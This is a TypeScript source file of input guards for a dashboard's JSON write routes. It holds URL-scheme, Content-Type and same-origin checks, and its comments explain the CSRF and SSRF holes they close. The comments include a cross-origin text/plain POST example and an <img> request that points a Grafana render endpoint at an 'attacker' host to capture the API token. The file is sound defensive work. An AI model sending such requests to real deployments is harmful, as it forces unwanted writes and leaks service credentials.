// Minimal input guards for the write routes (POST/PATCH to data/*.json). These
// routes persist client-supplied JSON to disk and, in the case of server
// entries, fetch the supplied URL server-side — so unvalidated input is both a
// file-corruption and an SSRF surface. No external schema lib: small guards keep
// the dependency footprint at zero.

// True only for a non-empty, length-bounded string.
export function isNonEmptyString(v: unknown, maxLen = 200): v is string {
  return typeof v === "string" && v.trim().length > 0 && v.length <= maxLen;
}

// True only for a parseable http/https URL string. Rejects other schemes
// (file:, gopher:, etc.) that would otherwise be fetchable server-side.
export function isHttpUrl(v: unknown, maxLen = 500): v is string {
  if (typeof v !== "string" || v.length > maxLen) return false;
  try {
    const u = new URL(v);
    return u.protocol === "http:" || u.protocol === "https:";
  } catch {
    return false;
  }
}

// Reject a write request that doesn't declare a JSON body.
//
// Why this is a security control and not a nicety: none of the write routes
// inspected Content-Type, and a cross-origin
//   fetch(url, { method: "POST", body: "{…}", headers: {"Content-Type":"text/plain"} })
// is a CORS *simple request* — no preflight — so any website the user visits
// could drive POST /api/config, /api/backup, /api/servers, /api/docker/restart
// and so on. The attacker can't read the response, but the write lands.
// Requiring application/json forces a preflight, which cross-origin callers
// then fail. DELETE is already preflighted, so it doesn't need this.
//
// When auth is on, SameSite=lax on the session cookie already blocks the
// vector — this closes it for the auth-off default, which is how the dashboard
// actually ships.
export function isJsonContentType(req: Request): boolean {
  const ct = req.headers.get("content-type");
  return !!ct && ct.split(";")[0].trim().toLowerCase() === "application/json";
}

// True when `candidate` points at the same origin (scheme + host + port) as
// `allowedBase`.
//
// `isHttpUrl` only proves a string parses and isn't `file:` — it says nothing
// about *where* it points. That distinction matters whenever we attach a
// credential to a client-supplied URL: /api/grafana/render and /api/grafana/test
// both took `?url=` verbatim and sent GRAFANA_API_TOKEN to it, so any page the
// user visited could fire an <img src="…/api/grafana/render?url=http://attacker/">
// and collect the service-account token from its own access log. Both are GET
// with no CSRF protection, which is what made it drive-by reachable.
//
// Compare against the origin the server already knows (cfg.grafana.baseUrl)
// rather than an allowlist — there is exactly one legitimate target.
export function isSameOrigin(candidate: unknown, allowedBase: string): candidate is string {
  if (typeof candidate !== "string") return false;
  try {
    return new URL(candidate).origin === new URL(allowedBase).origin;
  } catch {
    return false;
  }
}
